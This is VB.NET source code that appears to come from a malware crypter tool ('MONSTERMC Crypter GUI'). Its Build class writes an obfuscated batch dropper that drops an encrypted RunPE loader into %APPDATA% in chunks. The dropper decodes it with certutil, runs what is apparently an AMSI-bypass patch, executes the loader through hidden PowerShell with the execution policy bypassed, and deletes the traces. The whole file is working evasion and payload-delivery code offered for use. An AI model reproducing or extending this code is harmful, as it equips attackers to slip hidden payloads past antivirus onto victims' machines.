Imports System
Imports System.IO
Imports System.Text
Imports MONSTERMC.MONSTERMCCrypterGUI.Powershell
Namespace MONSTERMCCrypterGUI.Powershell
    Friend Class Build

        Public Shared Function RunPeLoader() As String


            Dim sb As StringBuilder = New StringBuilder()
            sb.Append(Files.PowershellRunPeLoader)
            sb.Replace("%CIPHER%", Randomize.Randomize.SourceEncrypt().Item4)
            sb.Replace("%THEKEY%", File.ReadAllText("PowershellKey.txt"))
            sb.Replace("%THEIV%", File.ReadAllText("PowershellIv.txt"))
            Dim plainbytes As Byte() = Encoding.UTF8.GetBytes(sb.ToString())
            Dim b64 = Convert.ToBase64String(plainbytes)
            Dim chunkSize As Integer = Math.Ceiling(b64.Length / 20)
            Dim chunks = New String(19) {}

            For i = 0 To 18
                chunks(i) = b64.Substring(i * chunkSize, chunkSize)
            Next

            chunks(19) = b64.Substring((20 - 1) * chunkSize)
            Dim detach As StringBuilder = New StringBuilder()
            For Each chunk In chunks
                detach.AppendLine("echo " & chunk & " >> ""%APPDATA%\Code.txt""")
            Next
            Call CreateNoNewLines()
            detach.AppendLine($"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc {CreateNoNewLines()}")
            detach.AppendLine("certutil -decode ""%APPDATA%\Code.txt"" ""%APPDATA%\Loader.ps1""")
            Dim amsi = Encoding.Unicode.GetBytes(Files.PowershellPatch)
            detach.AppendLine($"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyleHidden -Enc {Convert.ToBase64String(amsi)}")
            detach.AppendLine("powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""%APPDATA%\Loader.ps1""")
            detach.Append("DEL ""%APPDATA%\Loader.ps1""")
            detach.Append("DEL ""%APPDATA%\Code.txt""")
            Return detach.ToString()
        End Function

        Public Shared Function CreateNoNewLines() As String
            Dim sb As StringBuilder = New StringBuilder()
            sb.AppendLine("$filepath = ""$env:APPDATA\Code.txt""")
            sb.AppendLine("$content = Get-Content $filepath")
            sb.AppendLine("$noNewLines = $content -join """"")
            sb.AppendLine("$noNewLines | Set-Content $filepath")
            Dim plainbytes As Byte() = Encoding.Unicode.GetBytes(sb.ToString())
            Dim b64 = Convert.ToBase64String(plainbytes)
            Return b64
        End Function
        Public Shared Sub Create(ByVal path As String)
            Dim sb As StringBuilder = New StringBuilder()
            sb.AppendLine("@echo off")
            Dim amsi = Encoding.Unicode.GetBytes(Files.PowershellPatch)
            sb.AppendLine($"powershell -enc {Convert.ToBase64String(amsi)}")
            sb.AppendLine(RunPeLoader())
            Dim code As String = Stage1Protection.Obfuscate.RandomSubroutineName(Stage1Protection.Obfuscate.ControlFlow(sb.ToString()))
            File.WriteAllText(path, Stage1Protection.Obfuscate.TrimSpace(code))
        End Sub
    End Class
End Namespace
